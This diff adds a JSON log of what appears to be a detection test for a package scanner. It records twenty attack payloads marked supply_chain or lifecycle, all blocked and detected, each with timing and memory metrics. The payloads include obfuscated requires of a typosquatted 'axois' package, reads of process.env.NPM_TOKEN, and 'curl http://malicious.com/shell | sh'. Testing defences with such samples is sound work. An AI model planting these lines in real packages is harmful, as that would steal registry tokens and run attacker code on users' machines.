@@ -1,0 +1,242 @@
+[
+  {
+    "iteration": 0,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0x931df5f1ec50c8 = true; // No-op\nr_q(\"ax\" + \"ois\")",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 31.814,
+      "memory_delta_bytes": 646200,
+      "timestamp": "2026-04-24T19:32:02.801Z"
+    }
+  },
+  {
+    "iteration": 1,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0x1b72384d89752 = true; // No-op\nrequire(\"ax\" + \"ois\")",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 2.871,
+      "memory_delta_bytes": 62416,
+      "timestamp": "2026-04-24T19:32:02.804Z"
+    }
+  },
+  {
+    "iteration": 2,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0xac45e3d049e58 = true; // No-op\nprocess.env.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.98,
+      "memory_delta_bytes": 75256,
+      "timestamp": "2026-04-24T19:32:02.807Z"
+    }
+  },
+  {
+    "iteration": 3,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0x8aa30d32bbd63 = true; // No-op\np_e.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.541,
+      "memory_delta_bytes": 65912,
+      "timestamp": "2026-04-24T19:32:02.808Z"
+    }
+  },
+  {
+    "iteration": 4,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0xd4bc1a154de518 = true; // No-op\nprocess.env.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 3.485,
+      "memory_delta_bytes": 382904,
+      "timestamp": "2026-04-24T19:32:02.812Z"
+    }
+  },
+  {
+    "iteration": 5,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0xf968b4f1de567 = true; // No-op\nr_q(\"ax\" + \"ois\")",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 3.232,
+      "memory_delta_bytes": -352048,
+      "timestamp": "2026-04-24T19:32:02.816Z"
+    }
+  },
+  {
+    "iteration": 6,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0xd97dee52e60d68 = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 2.462,
+      "memory_delta_bytes": 139968,
+      "timestamp": "2026-04-24T19:32:02.819Z"
+    }
+  },
+  {
+    "iteration": 7,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0xa0c3d24e5b085 = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 2.311,
+      "memory_delta_bytes": 56584,
+      "timestamp": "2026-04-24T19:32:02.821Z"
+    }
+  },
+  {
+    "iteration": 8,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0xb7642a6749915 = true; // No-op\nr_q(\"axois\")",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.755,
+      "memory_delta_bytes": -244216,
+      "timestamp": "2026-04-24T19:32:02.823Z"
+    }
+  },
+  {
+    "iteration": 9,
+    "attack_type": "supply_chain",
+    "attack_payload": "p_e.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.525,
+      "memory_delta_bytes": 57576,
+      "timestamp": "2026-04-24T19:32:02.825Z"
+    }
+  },
+  {
+    "iteration": 10,
+    "attack_type": "supply_chain",
+    "attack_payload": "p_e.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 2.355,
+      "memory_delta_bytes": 59184,
+      "timestamp": "2026-04-24T19:32:02.828Z"
+    }
+  },
+  {
+    "iteration": 11,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0xc1496a72148b = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.484,
+      "memory_delta_bytes": 57488,
+      "timestamp": "2026-04-24T19:32:02.829Z"
+    }
+  },
+  {
+    "iteration": 12,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0xd1f4581a906d38 = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.167,
+      "memory_delta_bytes": 57816,
+      "timestamp": "2026-04-24T19:32:02.831Z"
+    }
+  },
+  {
+    "iteration": 13,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0x2104322fc9bd3 = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.291,
+      "memory_delta_bytes": 57984,
+      "timestamp": "2026-04-24T19:32:02.832Z"
+    }
+  },
+  {
+    "iteration": 14,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0x7cbce573eb5a7 = true; // No-op\nr_q(\"ax\" + \"ois\")",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.202,
+      "memory_delta_bytes": -45144,
+      "timestamp": "2026-04-24T19:32:02.834Z"
+    }
+  },
+  {
+    "iteration": 15,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0x294a3245fe11e = true; // No-op\nr_q(\"ax\" + \"ois\")",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 2.916,
+      "memory_delta_bytes": 61024,
+      "timestamp": "2026-04-24T19:32:02.837Z"
+    }
+  },
+  {
+    "iteration": 16,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0x8a5957693852e = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.361,
+      "memory_delta_bytes": 58960,
+      "timestamp": "2026-04-24T19:32:02.839Z"
+    }
+  },
+  {
+    "iteration": 17,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0xf24dd587769b9 = true; // No-op\np_e.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.574,
+      "memory_delta_bytes": 59200,
+      "timestamp": "2026-04-24T19:32:02.840Z"
+    }
+  },
+  {
+    "iteration": 18,
+    "attack_type": "lifecycle",
+    "attack_payload": "\nconst _0x872ed01310218 = true; // No-op\ncurl http://malicious.com/shell | sh",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 1.383,
+      "memory_delta_bytes": 59680,
+      "timestamp": "2026-04-24T19:32:02.842Z"
+    }
+  },
+  {
+    "iteration": 19,
+    "attack_type": "supply_chain",
+    "attack_payload": "\nconst _0xc7103651d034a8 = true; // No-op\np_e.NPM_TOKEN",
+    "verdict": "block",
+    "detected": true,
+    "metrics": {
+      "latency_ms": 2.148,
+      "memory_delta_bytes": 74432,
+      "timestamp": "2026-04-24T19:32:02.844Z"
+    }
+  }
+]
